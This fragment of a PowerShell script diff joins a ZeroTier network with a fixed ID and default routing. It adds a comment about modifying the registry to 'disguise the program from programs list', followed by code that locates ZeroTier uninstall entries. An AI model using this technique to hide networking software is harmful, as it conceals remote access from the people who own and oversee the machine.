@@ -53,6 +53,7 @@ $param1 = "-q"
 $param2 = "join"
 $NetworkID = "52b337794f5f54e7"
 & $zerotiercli $param1 $param2 $NetworkID allowDefault=1
+#Registry modificatin to disguise the program from programs list
 $KeyNamePattern = "Zerotier*"
 $RegPath = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
 $MatchingKeys = Get-ChildItem -Path $RegPath | Where-Object { $_.PSChildName -like $KeyNamePattern }
